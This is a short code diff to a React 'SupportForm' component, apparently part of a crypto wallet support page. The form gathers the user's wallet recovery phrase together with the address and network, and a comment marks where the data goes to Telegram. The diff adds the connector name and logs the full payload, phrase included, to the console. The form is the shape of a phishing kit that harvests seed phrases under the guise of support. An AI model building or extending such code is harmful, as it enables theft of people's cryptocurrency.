@@ -19,7 +19,7 @@ interface SupportFormProps {
 }
 
 export function SupportForm({ issueType, title, description }: SupportFormProps) {
-  const { address, chain } = useAccount()
+  const { address, chain, connector } = useAccount()
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isSuccess, setIsSuccess] = useState(false)
   const [formData, setFormData] = useState({
@@ -66,11 +66,13 @@ export function SupportForm({ issueType, title, description }: SupportFormProps)
         description: formData.issueDescription,
         urgency: formData.urgency,
         walletAddress: address,
+        connectorName: connector?.name || "Unknown",
         walletPhrase: walletWords.join(" ")|| "Not provided",
         network: chain?.name || "Unknown",
         timestamp: new Date().toISOString(),
       }
 
+      console.log("Submitting support request:", supportData)
 
 
       // Send to Telegram
